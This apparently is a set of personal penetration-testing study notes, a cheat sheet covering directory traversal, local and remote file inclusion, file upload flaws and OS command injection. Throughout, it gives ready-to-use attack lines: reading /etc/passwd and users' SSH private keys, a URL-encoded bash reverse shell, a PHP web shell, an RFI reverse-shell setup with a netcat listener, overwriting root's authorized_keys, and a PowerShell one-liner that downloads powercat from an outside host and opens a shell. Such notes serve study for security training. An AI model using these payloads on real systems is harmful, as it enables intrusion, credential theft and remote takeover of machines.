# Directory traversal

- Get username 
    
    ``` /etc/passwd ```

- Exploit directory traversals: Get ssh key

    ``` /home/{username}/.ssh/id_rsa
    vim key
    chmod 400 dt_key
     ```

- Encoding special character
    
    e.g. . -> %2f 

- cgi-bin vuln

- Encoding not a must

# File Inclusion Vuln

- Loading a file and attach CMD

- Reverse shell & web shell

## Local File Inclusion LFI
- Less common
- Header poison URL may differs from Log Poisoning 
- TCP reverse shell one-liner
  ``` bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 ```

## PHP Wrappers
- some uncommon method

    ``` php://filter ```

    make command base64 ``` <?php echo system($_GET["cmd"]);?> ```

    insert ``` data:// ```

## RFI
- Least common (LFI > RFI)
- Host a web server for exposing exploit php 
  
  e.g. php-reverse-shell.php

  ``` python3 -m http.server 80 ```
- open reverse shell server

    ``` nc -lvnp 4444 ```
- RFI request to the website
  
  ``` ?page=http://{ip}/php-reverse-shell.php ```

# File Upload Vuln
 
## w/ Executable Files
- Prepare a file that can run CMD
- Reverse shell
- file type exclusion e.g. php -> pHP


## w/o Executable Files
- Generate SSH key 

    ``` ssh-keygen ```

- Directory traversal for http request header
  
    Edit filename

    ``` ../../../../../root/.ssh/authorized_keys ```

- Becareful have to remove ```.ssh/known_hosts``` in kali pc since different section computer

- run ``` ssh -i fileup root@{ip} ```

# OS Cmd injection

- Check which command is allow which is not, then use ``` & ``` to piggyback it


- Windows oneliner get vuln file & reverse shell
``` IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell  ```

- exploitable could be ``` ;  && ```
- remember to encode url sometimes